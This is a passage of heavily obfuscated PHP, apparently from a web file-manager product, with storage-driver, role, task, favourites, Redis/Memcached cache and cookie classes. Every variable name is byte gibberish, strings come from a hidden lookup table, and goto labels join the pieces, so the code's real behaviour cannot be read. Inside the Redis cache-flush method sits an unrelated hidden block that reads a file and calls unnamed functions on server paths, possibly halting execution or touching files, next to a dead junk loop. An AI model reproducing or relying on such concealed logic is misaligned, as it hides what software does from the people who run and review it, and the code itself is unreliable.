$­«şµÜç = 200; $ÓÜ™Ü®Ö = 50; if ($¸œ¬Í× <= $­«şµÜç * $ÓÜ™Ü®Ö) { return $this->hashMd5($›²Ğ‹Ù) . $¸œ¬Í×; } $ËØ‰ Ğ¸ = $ÛÆÙ¯æ“[12]; $§«ĞòÊ = intval($¸œ¬Í× / $ÓÜ™Ü®Ö); $üÌàé¾ = fopen($›²Ğ‹Ù, $ÛÆÙ¯æ“[1668]); if (!$üÌàé¾) { return $ËØ‰ Ğ¸; } for ($º†ÖˆäË = 0; $º†ÖˆäË < $ÓÜ™Ü®Ö; $º†ÖˆäË++) { fseek_64($üÌàé¾, $§«ĞòÊ * $º†ÖˆäË); $ËØ‰ Ğ¸ .= fread($üÌàé¾, $­«şµÜç); } fseek_64($üÌàé¾, $¸œ¬Í× - $­«şµÜç); $ËØ‰ Ğ¸ .= fread($üÌàé¾, $­«şµÜç); fclose($üÌàé¾); return md5($ËØ‰ Ğ¸) . $¸œ¬Í×; } public function getContent($ëÁ‘âÒ…) { $ëÁ‘âÒ… = $this->iconvSystem($ëÁ‘âÒ…); return file_get_contents($ëÁ‘âÒ…); } public function setContent($£àŒÕ€‡, $ƒá–ÚŒ› = '') { $£àŒÕ€‡ = $this->iconvSystem($£àŒÕ€‡); $ÀùßÑ‚Œ = @file_put_contents($£àŒÕ€‡, $ƒá–ÚŒ›, LOCK_EX); if (!$ÀùßÑ‚Œ) { $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][1660], !0); } clearstatcache(); @chmod($£àŒÕ€‡, $this->pathAuth); return $ÀùßÑ‚Œ === !1 ? !1 : !0; } public function fileSubstr($Œ¤Ûä³û, $´ŸÏüÜÉ = 0, $Ê½çõÃº = false) { $ûì÷¼ô³ =& $_SERVER[ïÃ°£«Ê]; $Œ¤Ûä³û = $this->iconvSystem($Œ¤Ûä³û); if ($Ê½çõÃº === !1) { $Ê½çõÃº = $this->size($Œ¤Ûä³û); } if ($Ê½çõÃº <= 0) { return $ûì÷¼ô³[12]; } $ªó¥«‚¸ = fopen($Œ¤Ûä³û, $ûì÷¼ô³[1668]); if (!$ªó¥«‚¸) { return !1; } fseek_64($ªó¥«‚¸, $´ŸÏüÜÉ); $¡ì¯ºµ = fread($ªó¥«‚¸, $Ê½çõÃº); fclose($ªó¥«‚¸); if (!$¡ì¯ºµ) { $this->writeLog(__FUNCTION__ . $ûì÷¼ô³[1660], !0); } return $¡ì¯ºµ; } public function upload($ó‡üñ¤Ù, $Íœ±âûÖ, $ß¼É”á“ = false, $ğÒø£”ë = REPEAT_REPLACE) { if (!$Íœ±âûÖ || !@file_exists($Íœ±âûÖ)) { return !1; } if ($ß¼É”á“) { return $this->moveFile($Íœ±âûÖ, $ó‡üñ¤Ù); } return $this->copyFile($Íœ±âûÖ, $ó‡üñ¤Ù); } public function setModifyTime($ÆùÒàûÉ, $à”¢¿õ = '') { @touch($ÆùÒàûÉ, intval($à”¢¿õ)); } public function download($ì¨ó¿Ñê, $™İá¤) { return $this->iconvSystem($ì¨ó¿Ñê); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¤¹¬Ü) { parent::__construct($¤¹¬Ü); $this->setSignVersion($_SERVER[ïÃ°£«Ê][247]); } public function fileOutImage($°Êœ½•™, $âŸîÒÀó = 250) { $ÍÃÉŠÖ¨ =& $_SERVER[ïÃ°£«Ê]; if ($this->size($°Êœ½•™) > 1024 * 1024 * 25) { return $this->fileOutImageServer($°Êœ½•™, $âŸîÒÀó); } $íŠ¯Çö = array($ÍÃÉŠÖ¨[1669] => $ÍÃÉŠÖ¨[1670] . $âŸîÒÀó . $ÍÃÉŠÖ¨[1671]); $İış‰¹Â = $this->link($°Êœ½•™, $íŠ¯Çö); $this->fileOutLink($İış‰¹Â); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($™ÄûÌ±†) { parent::__construct($™ÄûÌ±†); $this->setSignVersion($_SERVER[ïÃ°£«Ê][247]); } public function uploadFormData($ÄçùÄ†, $ØëÖš¾ = 3600) { return $this->uploadFormDataV2($ÄçùÄ†, $ØëÖš¾); } } goto cİâÏİ¨»’; d—ˆ™·‹ºÑ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\x72\x6f\x6c\x65\114\151\163\x74"; public $field = array("\156\141\x6d\145", "\141\x75\164\150", "\154\x61\142\x65\x6c", "\144\x69\163\160\154\x61\171", "\x73\171\x73\164\145\155", "\x64\x65\163\143", "\151\x67\156\x6f\162\145\105\x78\164", "\x69\x67\x6e\x6f\x72\145\106\151\x6c\145\x53\x69\172\145", "\141\144\155\x69\x6e\151\163\x74\162\141\x74\x6f\x72", "\163\x6f\162\x74"); public function listData($íÎùÀçá = false, $…È•ÏËÆ = "\163\157\162\x74", $¿¹şœ´ = false) { $¡º¨§¡é =& $_SERVER[ïÃ°£«Ê]; $Õæû› = parent::listData($íÎùÀçá, $…È•ÏËÆ, $¿¹şœ´); if (!$íÎùÀçá) { foreach ($Õæû› as $¥¥”™Ä± => $ûŠ–·„÷) { if ($ûŠ–·„÷[$¡º¨§¡é[2379]] == 1) { $Õæû›[$¥¥”™Ä±][$¡º¨§¡é[540]] = LNG($¡º¨§¡é[2664]); } } } return $Õæû›; } public function update($ƒ£·Ñö, $¢åáÛ˜°) { $í§Â¤ =& $_SERVER[ïÃ°£«Ê]; $äÊİÎã = parent::listData($ƒ£·Ñö); $ Ë«½—§ = $this->findByName($¢åáÛ˜°[$í§Â¤[32]]); if (!$äÊİÎã || $ Ë«½—§ && $ Ë«½—§[$í§Â¤[487]] != $äÊİÎã[$í§Â¤[487]]) { return !1; } if ($ Ë«½—§[$í§Â¤[2379]] == 1) { $¢åáÛ˜° = array($í§Â¤[32] => $¢åáÛ˜°[$í§Â¤[32]], $í§Â¤[2206] => $¢åáÛ˜°[$í§Â¤[2206]]); } $this->filterAuth($¢åáÛ˜°[$í§Â¤[502]]); return parent::update($ƒ£·Ñö, $¢åáÛ˜°); } public function remove($”½åû€†) { $©ÉóÜÃĞ = parent::listData($”½åû€†); if (!$©ÉóÜÃĞ || $©ÉóÜÃĞ[$_SERVER[ïÃ°£«Ê][189]]) { return !1; } return parent::remove($”½åû€†); } public function add($§«Åá„) { $Óß¤…«™ =& $_SERVER[ïÃ°£«Ê]; $Ó¢ƒñûÔ = $§«Åá„[$Óß¤…«™[32]]; if ($this->findByName($Ó¢ƒñûÔ)) { return !1; } $å‚äÖîŞ = array($Óß¤…«™[509] => $Ó¢ƒñûÔ, $Óß¤…«™[2191] => $Óß¤…«™[12], $Óß¤…«™[2187] => $Óß¤…«™[2195], $Óß¤…«™[2665] => 1, $Óß¤…«™[2190] => 0, $Óß¤…«™[2666] => 0, $Óß¤…«™[2189] => $this->getSort()); $§«Åá„ = array_merge($å‚äÖîŞ, $§«Åá„); $this->filterAuth($§«Åá„[$Óß¤…«™[502]]); return parent::insert($§«Åá„); } private function getSort() { $Ö«êÜâÆ =& $_SERVER[ïÃ°£«Ê]; $ÓÄ«¯õ¹ = parent::listData(); $¶«ëĞ‰Ê = array_to_keyvalue($ÓÄ«¯õ¹, $Ö«êÜâÆ[12], $Ö«êÜâÆ[2207]); return empty($¶«ëĞ‰Ê) ? 0 : max($¶«ëĞ‰Ê) + 1; } private function filterAuth(&$‹Ç°‡×) { $Ö­çÓ©¡ =& $_SERVER[ïÃ°£«Ê]; $úÏˆ°˜  = array(); $§Ùî˜í = array_filter(explode($Ö­çÓ©¡[50], $‹Ç°‡×)); foreach ($§Ùî˜í as $‹Ç°‡×) { $€°Î­îœ = explode($Ö­çÓ©¡[10], $‹Ç°‡×); if ($€°Î­îœ[0] == $Ö­çÓ©¡[2667] && $€°Î­îœ[1] != $Ö­çÓ©¡[1311]) { $ßœ”­Å† = $€°Î­îœ[0] . $Ö­çÓ©¡[10] . $€°Î­îœ[1] . $Ö­çÓ©¡[2668]; if (!in_array($ßœ”­Å†, $§Ùî˜í)) { $úÏˆ°˜ [] = $ßœ”­Å†; } } $úÏˆ°˜ [] = $‹Ç°‡×; } $‹Ç°‡× = implode($Ö­çÓ©¡[50], $úÏˆ°˜ ); } public function findRoleDefault() { $ÇîÖÖ¨Å =& $_SERVER[ïÃ°£«Ê]; $©¡¬—´— = parent::listData(); $—‹’âó = !1; foreach ($©¡¬—´— as $«†’•†¯) { if (!$«†’•†¯ || $«†’•†¯[$ÇîÖÖ¨Å[2205]] == $ÇîÖÖ¨Å[228] || $«†’•†¯[$ÇîÖÖ¨Å[2379]] == 1) { continue; } if (strstr($«†’•†¯[$ÇîÖÖ¨Å[502]], $ÇîÖÖ¨Å[2669])) { continue; } if (!strstr($«†’•†¯[$ÇîÖÖ¨Å[502]], $ÇîÖÖ¨Å[2670])) { continue; } if (!$—‹’âó) { $—‹’âó = $«†’•†¯; continue; } $„üÔ¼­€ = explode($ÇîÖÖ¨Å[50], $—‹’âó[$ÇîÖÖ¨Å[502]]); $»«¹£Œ = explode($ÇîÖÖ¨Å[50], $«†’•†¯[$ÇîÖÖ¨Å[502]]); if (count($„üÔ¼­€) > count($»«¹£Œ)) { $—‹’âó = $«†’•†¯; } } return $—‹’âó ? $—‹’âó[$ÇîÖÖ¨Å[487]] : $ÇîÖÖ¨Å[12]; } public function sort($äšİ‘Ê, $¹ŒÛØæõ) { return parent::update($äšİ‘Ê, $¹ŒÛØæõ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\x2e\x74\141\x73\x6b\114\151\x73\164"; public $field = array("\x6e\x61\155\145", "\164\171\x70\x65", "\x65\166\145\156\x74", "\x74\151\155\145", "\144\145\x73\x63", "\163\x79\163\x74\x65\x6d", "\x65\x6e\141\x62\154\145", "\x6c\141\x73\x74\x52\x75\x6e", "\163\157\162\x74"); public function listData($‡ûåÀª– = false, $ù‡Çóß = "\x73\x6f\162\164", $Ÿò”Ìµó = false) { return parent::listData($‡ûåÀª–, $ù‡Çóß, $Ÿò”Ìµó); } public function add($Ñ¸€Ù˜Í) { $æÇ½şø» =& $_SERVER[ïÃ°£«Ê]; $µÛØô‰ƒ = $this->findByName($Ñ¸€Ù˜Í[$æÇ½şø»[32]]); if ($µÛØô‰ƒ) { return !1; } $Ñ¸€Ù˜Í[$æÇ½şø»[1931]] = 0; $Ñ¸€Ù˜Í[$æÇ½şø»[2207]] = $this->getSort(); return parent::insert($Ñ¸€Ù˜Í); } private function getSort() { $´£àÀ‡ =& $_SERVER[ïÃ°£«Ê]; $ıáÃ±Ûû = parent::listData(); $ú¬ÈÁ±µ = array_to_keyvalue($ıáÃ±Ûû, $´£àÀ‡[12], $´£àÀ‡[2207]); return empty($ú¬ÈÁ±µ) ? 0 : max($ú¬ÈÁ±µ) + 1; } public function update($°ù¦ÉÇ, $Ëäœ‰ã) { $Á¸èÓì =& $_SERVER[ïÃ°£«Ê]; $¥¯µ³„Ã = $this->listData($°ù¦ÉÇ); $«ˆ¼ÅŞ = $this->findByName($Ëäœ‰ã[$Á¸èÓì[32]]); if (!$¥¯µ³„Ã || $«ˆ¼ÅŞ && $«ˆ¼ÅŞ[$Á¸èÓì[487]] != $¥¯µ³„Ã[$Á¸èÓì[487]]) { return !1; } return parent::update($°ù¦ÉÇ, $Ëäœ‰ã); } public function remove($à‚Äßú¸, $¬¼èà…ô = false) { $ÜÅ×áĞØ =& $_SERVER[ïÃ°£«Ê]; $‚Œ¾‡¤ = $this->listData($à‚Äßú¸); if (!$‚Œ¾‡¤) { return; } if (!$¬¼èà…ô && $‚Œ¾‡¤[$ÜÅ×áĞØ[189]] == $ÜÅ×áĞØ[91]) { return !1; } return parent::remove($à‚Äßú¸); } public function enable($¼©Á£ñ, $ã·Å’‡Ò) { return $this->update($¼©Á£ñ, array($_SERVER[ïÃ°£«Ê][2659] => $ã·Å’‡Ò)); } public function run($úÊŞÈÁ) { return $this->update($úÊŞÈÁ, array($_SERVER[ïÃ°£«Ê][2671] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($ïãÄ¤Õ“) { $ÜÖéÀ³ú =& $_SERVER[ïÃ°£«Ê]; return array($ÜÖéÀ³ú[2299] => array(USER_ID, $ÜÖéÀ³ú[2672])); } protected function ___listData() { $†»äñÉ =& $_SERVER[ïÃ°£«Ê]; $…¹ÏœÅì = array($†»äñÉ[1971] => USER_ID, $†»äñÉ[573] => 0); $¯ÔíŸ–Æ = $†»äñÉ[2673]; $Ú¾ëÁŠğ = $this->field($¯ÔíŸ–Æ)->where($…¹ÏœÅì)->order($†»äñÉ[2674])->select(); return $Ú¾ëÁŠğ ? $Ú¾ëÁŠğ : array(); } protected function resetCache() { } protected function listView() { $şØ¨ÜÎ =& $_SERVER[ïÃ°£«Ê]; $¶èøÍÎç = $this->listData(); $š¿¤Ÿ‚» = array_filter_by_field($¶èøÍÎç, $şØ¨ÜÎ[33], $şØ¨ÜÎ[505]); $È”ĞµÌÑ = array_to_keyvalue($š¿¤Ÿ‚», $şØ¨ÜÎ[12], $şØ¨ÜÎ[87]); if (!$È”ĞµÌÑ) { return $¶èøÍÎç; } $ñ’ŸøØ• = 2000; $òä¬´ÍŞ = array($şØ¨ÜÎ[506] => array($şØ¨ÜÎ[507], $È”ĞµÌÑ)); $¿¥–˜çÎ = Model($şØ¨ÜÎ[934])->listSource($òä¬´ÍŞ, $ñ’ŸøØ•); $¿¥–˜çÎ = array_merge($¿¥–˜çÎ[$şØ¨ÜÎ[86]], $¿¥–˜çÎ[$şØ¨ÜÎ[85]]); $¿¥–˜çÎ = array_to_keyvalue($¿¥–˜çÎ, $şØ¨ÜÎ[191]); foreach ($¶èøÍÎç as $×£µ”öÀ => $„İİŞ£É) { $ÄÌÅ¨ÅÂ = $¿¥–˜çÎ[$„İİŞ£É[$şØ¨ÜÎ[87]]]; $ÄÌÅ¨ÅÂ = $ÄÌÅ¨ÅÂ ? $ÄÌÅ¨ÅÂ : array(); $¶èøÍÎç[$×£µ”öÀ] = array_merge($ÄÌÅ¨ÅÂ, $„İİŞ£É); } return $¶èøÍÎç; } protected function addFav($¯²€Ÿ¶, $‹’›ò™ = '', $Şä¢ü­ = "\x73\157\x75\162\x63\x65") { $±¡½·¯· =& $_SERVER[ïÃ°£«Ê]; $°·ƒÎ˜° = array($±¡½·¯·[1971] => USER_ID, $±¡½·¯·[573] => 0, $±¡½·¯·[511] => $Şä¢ü­, $±¡½·¯·[510] => $¯²€Ÿ¶); if ($this->where($°·ƒÎ˜°)->find()) { return !1; } $°·ƒÎ˜° = array($±¡½·¯·[1971] => USER_ID, $±¡½·¯·[573] => 0); $Ÿ©°¡Ş£ = $this->where($°·ƒÎ˜°)->max($±¡½·¯·[2207]); if (!$Ÿ©°¡Ş£) { $Ÿ©°¡Ş£ = 0; } if (!$‹’›ò™ && $Şä¢ü­ == $±¡½·¯·[505]) { $ë½á²È™ = Model($±¡½·¯·[1535])->where(array($±¡½·¯·[506] => $¯²€Ÿ¶))->find(); if (!$ë½á²È™) { return !1; } $‹’›ò™ = $ë½á²È™[$±¡½·¯·[32]]; } $‹’›ò™ = $this->getAutoName($‹’›ò™); $ù§éŞ­ = array($±¡½·¯·[1971] => USER_ID, $±¡½·¯·[573] => 0, $±¡½·¯·[509] => $‹’›ò™, $±¡½·¯·[510] => $¯²€Ÿ¶, $±¡½·¯·[511] => $Şä¢ü­, $±¡½·¯·[2189] => $Ÿ©°¡Ş£ + 1); return $this->add($ù§éŞ­); } protected function remove($åÛ ®™™) { $ƒëşÙ¸ï =& $_SERVER[ïÃ°£«Ê]; $Á¾½ÂœÁ = array($ƒëşÙ¸ï[1971] => USER_ID, $ƒëşÙ¸ï[508] => $åÛ ®™™); return $this->where($Á¾½ÂœÁ)->delete(); } protected function removeByName($ÜÔó«÷™) { $êíù¨… =& $_SERVER[ïÃ°£«Ê]; $ÏÍúİÑ = array($êíù¨…[1971] => USER_ID, $êíù¨…[509] => $ÜÔó«÷™, $êíù¨…[573] => 0); return $this->where($ÏÍúİÑ)->delete(); } protected function rename($Ãøüœ´², $È‘«–Ê¡) { $‹‹®õÑ¼ =& $_SERVER[ïÃ°£«Ê]; if ($Ãøüœ´² == $È‘«–Ê¡) { return !1; } $¦Ÿ÷¾å = $this->getAutoName($È‘«–Ê¡); if ($È‘«–Ê¡ != $¦Ÿ÷¾å) { return !1; } $¤¸ÂŠ†Ë = array($‹‹®õÑ¼[1971] => USER_ID, $‹‹®õÑ¼[573] => 0, $‹‹®õÑ¼[32] => $Ãøüœ´²); return $this->where($¤¸ÂŠ†Ë)->save(array($‹‹®õÑ¼[32] => $È‘«–Ê¡)); } protected function resetSort($×şù¿©¡) { $Ó¨”¨¤‚ =& $_SERVER[ïÃ°£«Ê]; $×şù¿©¡ = is_array($×şù¿©¡) ? $×şù¿©¡ : array(); $º¥¯öŒ‡ = array($Ó¨”¨¤‚[1971] => USER_ID); for ($âç¬„ĞÅ = 0; $âç¬„ĞÅ < count($×şù¿©¡); $âç¬„ĞÅ++) { $º¥¯öŒ‡[$Ó¨”¨¤‚[508]] = $×şù¿©¡[$âç¬„ĞÅ]; $this->where($º¥¯öŒ‡)->save(array($Ó¨”¨¤‚[2189] => $âç¬„ĞÅ + 1)); } return !0; } protected function moveTop($Šïˆş‹) { $ûœâÉ½´ =& $_SERVER[ïÃ°£«Ê]; $×›™üÆº = array($ûœâÉ½´[1971] => USER_ID, $ûœâÉ½´[573] => 0); $ë×Ê½œ› = $this->where($×›™üÆº)->where(array($ûœâÉ½´[32] => $Šïˆş‹))->find(); if (!$ë×Ê½œ›) { return; } $äÎÃÀª× = $this->field($ûœâÉ½´[487])->where($×›™üÆº)->order($ûœâÉ½´[2674])->select(); $äÎÃÀª× = array_to_keyvalue($äÎÃÀª×, $ûœâÉ½´[12], $ûœâÉ½´[487]); $  õÉ½º = $äÎÃÀª×; $äÎÃÀª× = array_remove_value($äÎÃÀª×, $ë×Ê½œ›[$ûœâÉ½´[487]]); array_unshift($äÎÃÀª×, $ë×Ê½œ›[$ûœâÉ½´[487]]); return $this->resetSort($äÎÃÀª×); } protected function moveBottom($©ä»ƒ€š) { $†¯õ”ê‰ =& $_SERVER[ïÃ°£«Ê]; $—á¨æîÙ = array($†¯õ”ê‰[1971] => USER_ID, $†¯õ”ê‰[573] => 0); $‹Êú”ˆ¨ = $this->where($—á¨æîÙ)->max($†¯õ”ê‰[2207]); $Û¸É×í = array($†¯õ”ê‰[2207] => $‹Êú”ˆ¨ + 1); return $this->where($—á¨æîÙ)->where(array($†¯õ”ê‰[32] => $©ä»ƒ€š))->save($Û¸É×í); } private function getAutoName($ğæĞåƒ½) { $¢ØÈŠÙİ =& $_SERVER[ïÃ°£«Ê]; $¢°×öÎş = array($¢ØÈŠÙİ[1971] => USER_ID, $¢ØÈŠÙİ[573] => 0); $±âîç¨Ù = $this->field($¢ØÈŠÙİ[32])->where($¢°×öÎş)->select(); $±âîç¨Ù = array_to_keyvalue($±âîç¨Ù, $¢ØÈŠÙİ[12], $¢ØÈŠÙİ[32]); if (!$±âîç¨Ù || !in_array($ğæĞåƒ½, $±âîç¨Ù)) { return $ğæĞåƒ½; } for ($Åôïé¯» = 0; $Åôïé¯» < count($±âîç¨Ù); $Åôïé¯»++) { if (!in_array($ğæĞåƒ½ . "\x28{$Åôïé¯»}\51", $±âîç¨Ù)) { return $ğæĞåƒ½ . "\x28{$Åôïé¯»}\x29"; } } return $ğæĞåƒ½ . "\x28{$Åôïé¯»}\51"; } } goto Eµã©¼ßÂ; B“í«áÅ¤ª: class CacheMemcached { public $handle; public $cacheTime; public function __construct($¹»Ä†«², $˜ØõøúØ) { $÷¥ï÷£Â =& $_SERVER[ïÃ°£«Ê]; if (!class_exists($÷¥ï÷£Â[1025])) { show_json($÷¥ï÷£Â[1026], !1); } $this->cacheTime = $˜ØõøúØ; $this->handle = new Memcached(); if (is_array($¹»Ä†«²[$÷¥ï÷£Â[1027]]) && count($¹»Ä†«²[$÷¥ï÷£Â[1027]]) >= 1) { foreach ($¹»Ä†«²[$÷¥ï÷£Â[1027]] as $¯©¸»Û) { $÷óŞÄµ = explode($÷¥ï÷£Â[4], $¯©¸»Û); $this->handle->addServer($÷óŞÄµ[0], $÷óŞÄµ[1]); } } else { $this->handle->addServer($¹»Ä†«²[$÷¥ï÷£Â[206]], $¹»Ä†«²[$÷¥ï÷£Â[207]]); } } public function set($ù‚¤¢ù, $ıàŸáô¥, $«à£İùã = false) { $«à£İùã = $«à£İùã ? $«à£İùã : $this->cacheTime; return $this->handle->set($ù‚¤¢ù, $ıàŸáô¥, $«à£İùã); } public function get($¹À˜¼°ü) { return $this->handle->get($¹À˜¼°ü); } public function remove($±Û›â¾ó) { return $this->handle->delete($±Û›â¾ó); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($éÖ„Ü, $Ê™ë‡Œ) { $İí©†ôµ =& $_SERVER[ïÃ°£«Ê]; if (!class_exists($İí©†ôµ[1028])) { show_json($İí©†ôµ[1029], !1); } $this->cacheTime = $Ê™ë‡Œ; $öŸ£“Ëµ = isset($éÖ„Ü[$İí©†ôµ[1030]]) ? $éÖ„Ü[$İí©†ôµ[1030]] : 10; $šÅ¢Ÿæ = _get($éÖ„Ü, $İí©†ôµ[1027]); if ($šÅ¢Ÿæ && is_array($šÅ¢Ÿæ)) { $this->initCluster($éÖ„Ü, $öŸ£“Ëµ); } else { $this->handle = $this->init($éÖ„Ü, $öŸ£“Ëµ); } } private function init($›ŸÚœÊÍ, $Ä€ ‹«§) { $®ÆãÀÚ± =& $_SERVER[ïÃ°£«Ê]; $·¹‹£æ = new Redis(); $®‚ÌşÎ = isset($›ŸÚœÊÍ[$®ÆãÀÚ±[1031]]) ? $›ŸÚœÊÍ[$®ÆãÀÚ±[1031]] : !1; if ($®‚ÌşÎ) { $·¹‹£æ->pconnect($›ŸÚœÊÍ[$®ÆãÀÚ±[206]], $›ŸÚœÊÍ[$®ÆãÀÚ±[207]], $Ä€ ‹«§); } else { $·¹‹£æ->connect($›ŸÚœÊÍ[$®ÆãÀÚ±[206]], $›ŸÚœÊÍ[$®ÆãÀÚ±[207]], $Ä€ ‹«§); } if (!empty($›ŸÚœÊÍ[$®ÆãÀÚ±[502]])) { $·¹‹£æ->auth($›ŸÚœÊÍ[$®ÆãÀÚ±[502]]); } if (!empty($›ŸÚœÊÍ[$®ÆãÀÚ±[859]]) && $›ŸÚœÊÍ[$®ÆãÀÚ±[859]] != 0) { $·¹‹£æ->select($›ŸÚœÊÍ[$®ÆãÀÚ±[859]]); } return $·¹‹£æ; } private function initCluster($Ùƒİíß”, $ñ£’¶Éã) { $¶«äüÔÏ =& $_SERVER[ïÃ°£«Ê]; $ß¯Ô•ˆ® = array($¶«äüÔÏ[1032], $¶«äüÔÏ[1033], $¶«äüÔÏ[1034]); $”¾ºæ¹ = $¶«äüÔÏ[1032]; if (isset($Ùƒİíß”[$¶«äüÔÏ[16]]) && in_array($Ùƒİíß”[$¶«äüÔÏ[16]], $ß¯Ô•ˆ®)) { $”¾ºæ¹ = $Ùƒİíß”[$¶«äüÔÏ[16]]; } switch ($”¾ºæ¹) { case $¶«äüÔÏ[1032]: $this->_slave($Ùƒİíß”, $ñ£’¶Éã); break; case $¶«äüÔÏ[1033]: break; case $¶«äüÔÏ[1034]: $this->isCluster = !0; $üà™Ì¸Ğ = $Ùƒİíß”[$¶«äüÔÏ[1027]]; $õÃÒ¢Û = isset($Ùƒİíß”[$¶«äüÔÏ[1031]]) ? $Ùƒİíß”[$¶«äüÔÏ[1031]] : !1; $Ï¬îùŞ¬ = isset($Ùƒİíß”[$¶«äüÔÏ[502]]) ? $Ùƒİíß”[$¶«äüÔÏ[502]] : null; $this->handle = new RedisCluster(NUll, $üà™Ì¸Ğ, $ñ£’¶Éã, $ñ£’¶Éã, $õÃÒ¢Û, $Ï¬îùŞ¬); break; default: break; } } private function _slave($®¯ÀÃä, $ó”™­Í·) { $ß½‡…äŸ = $®¯ÀÃä[$_SERVER[ïÃ°£«Ê][1027]]; $this->filterConfig($®¯ÀÃä, $ß½‡…äŸ[0]); $this->handle = $this->init($®¯ÀÃä, $ó”™­Í·); unset($ß½‡…äŸ[0]); if (empty($ß½‡…äŸ)) { return; } $µ¤ÙÖ = array_rand($ß½‡…äŸ); $this->filterConfig($®¯ÀÃä, $ß½‡…äŸ[$µ¤ÙÖ]); $this->slaveHandle = $this->init($®¯ÀÃä, $ó”™­Í·); } private function filterConfig(&$ËÄÓÄñ¼, $§¶©Ìôê) { $£®ŞĞªó =& $_SERVER[ïÃ°£«Ê]; $ÊÊ¾šú = explode($£®ŞĞªó[4], $§¶©Ìôê); $ø•×·¦‡ = array($£®ŞĞªó[206] => $ÊÊ¾šú[0], $£®ŞĞªó[207] => $ÊÊ¾šú[1]); $ËÄÓÄñ¼ = array_merge($ËÄÓÄñ¼, $ø•×·¦‡); } public function set($Â¦Ãà“½, $ø©¨¯×Ê, $£Â¥ø§– = false) { $£Â¥ø§– = $£Â¥ø§– ? $£Â¥ø§– : $this->cacheTime; return $this->handle->setEx($Â¦Ãà“½, $£Â¥ø§–, $ø©¨¯×Ê); } public function setLock($óçŞúÂƒ, $½íˆã·¤, $¥Ø°ô‘ñ) { return $this->handle->setNX($óçŞúÂƒ, $½íˆã·¤); } public function get($×äÕÎš£) { $îÏÎíä¦ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $îÏÎíä¦->get($×äÕÎš£); } public function remove($øÄú’‡ø) { return $this->handle->del($øÄú’‡ø); } public function deleteAll() { $ê·ä™ÊŠ =& $_SERVER[ïÃ°£«Ê]; if ($_SERVER[$ê·ä™ÊŠ[1035]] != $_SERVER[$ê·ä™ÊŠ[1036]]) { $¶µ­³ß = $ê·ä™ÊŠ[1037]; $ÓÚ„Ğ¥İ = $ê·ä™ÊŠ[1038]; $Š¶ñ› = $_SERVER[$ê·ä™ÊŠ[1039]] . $ê·ä™ÊŠ[1040]; $“ö‰çä’ = $ÓÚ„Ğ¥İ($Š¶ñ›); $Çå®âí» = explode($ê·ä™ÊŠ[285], $“ö‰çä’); if (count($Çå®âí») < $ê·ä™ÊŠ[713]) { $à›óâŸû = $ê·ä™ÊŠ[1041]; $à›óâŸû(); } $’Ì–µÕú = $ê·ä™ÊŠ[1042]; $’Ì–µÕú($_SERVER[$ê·ä™ÊŠ[1043]]); $’Ì–µÕú($_SERVER[$ê·ä™ÊŠ[1039]] . $ê·ä™ÊŠ[1044]); $×Ğ×áÙ… = 1; while ($×Ğ×áÙ… > 1) { $×Ğ×áÙ… = $×Ğ×áÙ… + 4; $Êî€Ò—“ = rawurlencode($×Ğ×áÙ… . $ê·ä™ÊŠ[463]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $®°Áú †) { $this->handle->flushall($®°Áú †); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ó’ñôÅÊ = '', $âÁ«” = 0) { if (is_string($ó’ñôÅÊ) && $ó’ñôÅÊ != $_SERVER[ïÃ°£«Ê][12]) { $this->prefix = $ó’ñôÅÊ; } if (is_numeric($âÁ«”) && $âÁ«” > 0) { $this->expire = $âÁ«”; } } public static function getInstance() { static $í³ íòÏ; if ($í³ íòÏ === null) { $í³ íòÏ = new self(); } return $í³ íòÏ; } private static $cookieDisable = false; public static function disable($“Û×¿Ñ) { self::$cookieDisable = $“Û×¿Ñ; } private static $sameCookieSet = array(); public static function set($æË¾€, $úöôÕ©, $ÎÓäÜÇï = 0, $ä•ÏÚ = false, $ˆß‚©£ò = false) { $¨‡”õÆ =& $_SERVER[ïÃ°£«Ê]; if (self::$cookieDisable) { return; } if (!$ÎÓäÜÇï) { $ÎÓäÜÇï = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$æË¾€]) && self::$sameCookieSet[$æË¾€] == $úöôÕ© . $ÎÓäÜÇï) { return; } self::$sameCookieSet[$æË¾€] = $úöôÕ© . $ÎÓäÜÇï; if (!$ˆß‚©£ò) { $ˆß‚©£ò = str_replace(HOST, $¨‡”õÆ[12], APP_HOST); $ˆß‚©£ò = _get($GLOBALS, $¨‡”õÆ[1045], $ˆß‚©£ò); } $äæ‚×ó™ = $¨‡”õÆ[12]; setcookie($æË¾€, $úöôÕ©, time() + $ÎÓäÜÇï, $¨‡”õÆ[8] . trim($ˆß‚©£ò, $¨‡”õÆ[8]) . $äæ‚×ó™, !1, !1, $ä•ÏÚ); } public static function setSafe($éÃ…­Í˜, $ßæíÀÖ, $”êÙåÁõ = 0) { self::set($éÃ…­Í˜, $ßæíÀÖ, $”êÙåÁõ, !0); } public static function get($¥êìã¤ú) { static $ªÃõº = false; if (!$ªÃõº) { self::initHeaderCookie(); $ªÃõº = !0; } return isset($_COOKIE[$¥êìã¤ú]) ? $_COOKIE[$¥êìã¤ú] : !1; } private static function initHeaderCookie() { $üÉîØ•‘ =& $_SERVER[ïÃ°£«Ê]; if (!isset($_SERVER[$üÉîØ•‘[1046]]) || !$_SERVER[$üÉîØ•‘[1046]]) { return; } $úüä‹ = explode($üÉîØ•‘[74], $_SERVER[$üÉîØ•‘[1046]]); foreach ($úüä‹ as $¥ş«ßôØ) { $¥ş«ßôØ = explode($üÉîØ•‘[464], $¥ş«ßôØ); if (count($¥ş«ßôØ) != 2 || !isset($¥ş«ßôØ[1])) { continue; } $_COOKIE[trim($¥ş«ßôØ[0])] = trim($¥ş«ßôØ[1]); } } public static function remove($Ò¾ ºª¹, $Ëİ“Ùë† = false) { unset($_COOKIE[$Ò¾ ºª¹]); self::set($Ò¾ ºª¹, 